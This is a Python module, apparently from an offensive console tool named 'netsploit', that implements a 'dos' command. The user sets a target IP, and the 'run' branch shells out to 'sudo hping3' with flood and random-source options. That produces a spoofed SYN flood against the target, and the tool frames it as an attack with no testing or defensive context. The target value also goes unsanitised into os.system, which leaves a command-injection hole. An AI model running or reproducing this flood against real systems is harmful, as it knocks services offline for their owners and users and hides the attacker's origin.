# import required modules and libraries
import os
from simple_colors import yellow, blue, green, red, cyan
import datetime
from tabulate import tabulate
from functions.utils.font_styles import *
from functions.utils.config import logs_folder_path, db

def dos():
    from functions.utils.prompt import prompt
    prompt_input = input(
            f'{yellow("netsploit", "underlined")} => {blue("(dos)", "bold")} {green(">")} ')  # noqa
    prompt_input = prompt_input.lower()

    if prompt_input == 'show options':
        value = '(not set)' if db.get(
                'TARGET') is False else db.get('TARGET')
        # Table for displaying options and other info
        table = [['OPTIONS', 'VALUE', 'OPTIONAL?'], ['TARGET', value, 'no']]  # noqa
        # Print the table (on to the console, of course)
        print(tabulate(table, headers='firstrow', tablefmt='fancy_grid'))
        dos()

    elif prompt_input.startswith('target =>') or prompt_input.startswith('set target'):  # noqa
        # split prompt_input from string to array
        optionArgs = prompt_input.split()
        # option is the second index (3rd string) in array
        option = optionArgs[2]
        # Set IP range to given option
        db.set('TARGET', option)
        # Display success message like this: "IP_RANGE set to 192.168.0.1"
        success_message(f'TARGET set to "{db.get("TARGET")}"')
        dos()

    elif prompt_input == 'run':
        TARGET = db.get('TARGET')
        if TARGET is False:
            error_message(
                'Cannot run DoS attack without TARGET being specified. Please specify the TARGET and try again')  # noqa
            dos()
        else:
            info_message(f'Running DoS attack on {TARGET}, this may take up to two minutes')  # noqa
            info_message('Running a DoS attack properly requires the command to be run using sudo')  # noqa
            print()
            os.system(f'sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source {TARGET}')  # noqa
            print()
            success_message(f'Finished attacking {TARGET}')
            dos()
        dos()

    elif prompt_input == 'exit':
        exit()

    elif prompt_input == 'back':
        prompt()

    elif prompt_input == '':
        dos()

    elif prompt_input == 'help':
        print()
        print(f'{cyan("Help for dos:", ["bold", "underlined"])}')
        print()
        print(f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}')  # noqa
        print(f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (make sure to replace 123.456.789 with the IP of your target!)')  # noqa
        print(f'2. Run your scan using {yellow("run", "bold")}')
        print()
        dos()

    elif prompt_input == 'clear':
        os.system('clear')
        dos()

    else:
        invalidCommand = prompt_input.split()[0]
        error_message(f'Invalid command "{invalidCommand}". Please enter a valid command')  # noqa
        dos()